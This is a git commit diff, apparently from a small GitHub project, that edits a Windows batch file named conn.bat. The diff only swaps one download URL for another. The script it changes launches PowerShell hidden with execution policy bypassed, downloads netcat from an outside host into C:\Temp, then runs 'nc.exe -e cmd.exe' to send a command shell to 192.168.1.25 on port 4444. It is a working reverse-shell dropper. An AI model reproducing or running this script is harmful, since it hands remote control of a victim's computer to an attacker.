235e3da85a5e0d993c4541439000723f18d82073
Vimarkov <42305465+Vimarkov@users.noreply.github.com>
2021-07-12 11:55:54 +0200

    Update conn.bat

--- conn.bat
+++ conn.bat
@@ -1,3 +1,3 @@
-powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http:/megavirusdelamort.lestutosdeprocessus.fr/nc.zip','C:\Temp\nc.exe');"
+powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://joncraton.org/files/nc111nt.zip','C:\Temp\nc.exe');"
 
 C:\Temp\nc.exe -e cmd.exe 192.168.1.25 4444
